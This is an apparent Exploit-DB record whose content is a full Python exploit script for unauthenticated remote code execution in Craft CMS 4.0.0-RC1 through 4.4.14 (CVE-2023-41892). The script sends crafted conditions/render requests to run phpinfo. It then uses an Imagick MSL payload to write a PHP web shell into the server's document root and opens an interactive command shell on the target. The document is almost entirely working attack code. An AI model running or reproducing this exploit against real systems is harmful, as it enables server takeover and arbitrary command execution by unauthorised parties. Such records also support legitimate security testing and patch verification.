{"source": "https://www.exploit-db.com/exploits/51918", "vulnName": "Craft CMS 4.4.14 - Unauthenticated Remote Code Execution", "vulnEDBID": "51918", "vulnCVE": "N/A", "author": "OLIVIER LASNE", "exploitType": "WEBAPPS", "platform": "PHP", "datePublished": "2024-03-25", "vulnContent": "#!/usr/bin/env python3\n#coding: utf-8\n\n# Exploit Title: Craft CMS unauthenticated Remote Code Execution (RCE)\n# Date: 2023-12-26\n# Version: 4.0.0-RC1 - 4.4.14\n# Vendor Homepage: https://craftcms.com/\n# Software Link: https://github.com/craftcms/cms/releases/tag/4.4.14\n# Tested on: Ubuntu 22.04.3 LTS\n# Tested on: Craft CMS 4.4.14\n# Exploit Author: Olivier Lasne\n# CVE : CVE-2023-41892\n# References :\n# https://github.com/craftcms/cms/security/advisories/GHSA-4w8r-3xrw-v25g\n# https://blog.calif.io/p/craftcms-rce\n\nimport requests\nimport sys, re\n\nif(len(sys.argv) < 2):\n    print(f\"\\033[1;96mUsage:\\033[0m python {sys.argv[0]} \\033[1;96m<url>\\033[0m\")\n    exit()\n\nHOST = sys.argv[1]\n\nif not re.match('^https?://.*', HOST):\n    print(\"\\033[1;31m[-]\\033[0m URL should start with http or https\")\n    exit()\n\nprint(\"\\033[1;96m[+]\\033[0m Executing phpinfo to extract some config infos\")\n\n## Execute phpinfo() and extract config info from the website\nurl = HOST + '/index.php'\ncontent_type = {'Content-Type': 'application/x-www-form-urlencoded'}\n\ndata = r'action=conditions/render&test[userCondition]=craft\\elements\\conditions\\users\\UserCondition&config={\"name\":\"test[userCondition]\",\"as xyz\":{\"class\":\"\\\\GuzzleHttp\\\\Psr7\\\\FnStream\",\"__construct()\":[{\"close\":null}],\"_fn_close\":\"phpinfo\"}}'\n\ntry:\n    r = requests.post(url, headers=content_type, data=data)\nexcept:\n    print(f\"\\033[1;31m[-]\\033[0m Could not connect to {HOST}\")\n    exit()\n\n# If we succeed, we should have default phpinfo credits \nif not 'PHP Group' in r.text:\n print(f'\\033[1;31m[-]\\033[0m {HOST} is not exploitable.')\n exit()\n\n\n# Extract config value for tmp_dir and document_root\npattern1 = r'<tr><td class=\"e\">upload_tmp_dir<\\/td><td class=\"v\">(.*?)<\\/td><td class=\"v\">(.*?)<\\/td><\\/tr>'\npattern2 = r'<tr><td class=\"e\">\\$_SERVER\\[\\'DOCUMENT_ROOT\\'\\]<\\/td><td class=\"v\">([^<]+)<\\/td><\\/tr>'\n\ntmp_dir       = re.search(pattern1, r.text, re.DOTALL).group(1)\ndocument_root = re.search(pattern2, r.text, re.DOTALL).group(1)\n\n\nif 'no value' in tmp_dir:\n tmp_dir = '/tmp'\n\nprint(f'temporary directory: {tmp_dir}')\nprint(f'web server root: {document_root}')\n\n## Create shell.php in tmp_dir\n\ndata = {\n    \"action\": \"conditions/render\",\n    \"configObject[class]\": \"craft\\elements\\conditions\\ElementCondition\",\n    \"config\": '{\"name\":\"configObject\",\"as \":{\"class\":\"Imagick\", \"__construct()\":{\"files\":\"msl:/etc/passwd\"}}}'\n}\n\nfiles = {\n    \"image1\": (\"pwn1.msl\", \"\"\"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n    <image>\n    <read filename=\"caption:<?php @system(@$_REQUEST['cmd']); ?>\"/>\n    <write filename=\"info:DOCUMENTROOT/shell.php\"/>\n    </image>\"\"\".replace(\"DOCUMENTROOT\", document_root), \"text/plain\")\n}\n\nprint(f'\\033[1;96m[+]\\033[0m create shell.php in {tmp_dir}')\nr = requests.post(url, data=data, files=files) #, proxies={'http' : 'http://127.0.0.1:8080'}) #  \n\n\n# Use the Imagick trick to move the webshell in DOCUMENT_ROOT\n\ndata = {\n    \"action\": \"conditions/render\",\n    \"configObject[class]\": r\"craft\\elements\\conditions\\ElementCondition\",\n    \"config\": '{\"name\":\"configObject\",\"as \":{\"class\":\"Imagick\", \"__construct()\":{\"files\":\"vid:msl:' + tmp_dir + r'/php*\"}}}'\n}\n\nprint(f'\\033[1;96m[+]\\033[0m trick imagick to move shell.php in {document_root}')\nr = requests.post(url, data=data) #, proxies={\"http\": \"http://127.0.0.1:8080\"})\n\nif r.status_code != 502:\n    print(\"\\033[1;31m[-]\\033[0m Exploit failed\")\n    exit()\n\nprint(f\"\\n\\033[1;95m[+]\\033[0m Webshell is deployed: {HOST}/\\033[1mshell.php\\033[0m?cmd=whoami\")\nprint(f\"\\033[1;95m[+]\\033[0m Remember to \\033[1mdelete shell.php\\033[0m in \\033[1m{document_root}\\033[0m when you're done\\n\")\nprint(\"\\033[1;92m[!]\\033[0m Enjoy your shell\\n\")\n\nurl = HOST + '/shell.php'\n\n## Pseudo Shell\nwhile True:\n    command = input('\\033[1;96m>\\033[0m ')\n    if command == 'exit':\n        exit()\n\n    if command == 'clear' or command == 'cls':\n        print('\\n' * 100)\n        print('\\033[H\\033[3J', end='')\n        continue\n\n    data = {'cmd' : command}\n    r = requests.post(url, data=data) #, proxies={\"http\": \"http://127.0.0.1:8080\"})\n\n    # exit if we have an error\n    if r.status_code != 200:\n        print(f\"Error: status code {r.status_code} for {url}\")\n        exit()\n\n    res_command = r.text\n    res_command = re.sub('^caption:', '', res_command)\n    res_command = re.sub(' CAPTION.*$', '', res_command)\n\n    print(res_command, end='')\n            "}